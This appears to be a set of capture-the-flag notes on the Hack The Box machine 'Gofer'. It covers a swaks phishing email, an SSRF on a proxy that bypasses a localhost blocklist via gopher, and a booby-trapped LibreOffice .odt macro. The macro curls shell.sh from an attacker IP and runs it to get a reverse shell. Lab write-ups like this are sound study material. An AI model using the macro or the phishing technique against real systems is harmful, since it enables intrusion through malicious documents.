SMB showed a email {

  "Jocelyn received phishing attempt last week and his habit of clicking on links without paying much attention"
  "If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice."
  "I know you're working on our web proxy but if you could restrict access"
}

Contact Section of the gofer.htb is not set up so this cannot be possibly exploited!

swaks --to hjocelyn@gofer.htb --from ender@root.htb --server 10.10.11.225 --body "http://10.10.14.41:80/index.html" --header "Subject: Click Me!" --> send an email using swaks

Attempting to use swaks is failing due to Connection Timeout!

The email talked about a proxy, wfuzz shoes a proxy.gofer.htb domain! ==> Unauthorized

Sending a modified request to proxy.gofer.htb we can discover important information!
  All websites and domains have index.* we can play around changing it to .html .php .aspx etc
  We also can modify the Req Type to POST, and if we send a POST to index.php we get told
  Missing URL Parameter! ==> POST /index.php?url=http://10.10.14.41:80/index.html

We have an SSRF from the POST Req!

  2.) OfficeLibre Phish Attack can be attempted (.odt)

  4.) https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher

Because there is black-listing for 127, localhost, etc: we can bypass by

After URL-Encoding the payload twice and compressing it into a 1-liner
You can send phishing emails to jhudson@gofer.htb!

In order to make a proper boobytrap .odt file we need to use the LibreOffice Application
Going through we can go into Tools > Macros > Edit Macros, We can add our own custom Macros
Written in Visual Basic

VB Code ---------

Sub Main
	Shell("curl http://10.10.14.41:80/shell.sh -o /tmp/shell.sh")
	Shell("chmod +x /tmp/shell.sh")
	Shell("bash /tmp/shell.sh")
End Sub

-----------------

After building the libreFile.odt we can now send a phishing email to the target email
and then we will see a hit on libreFile -> shell.sh -> nc shell recieved
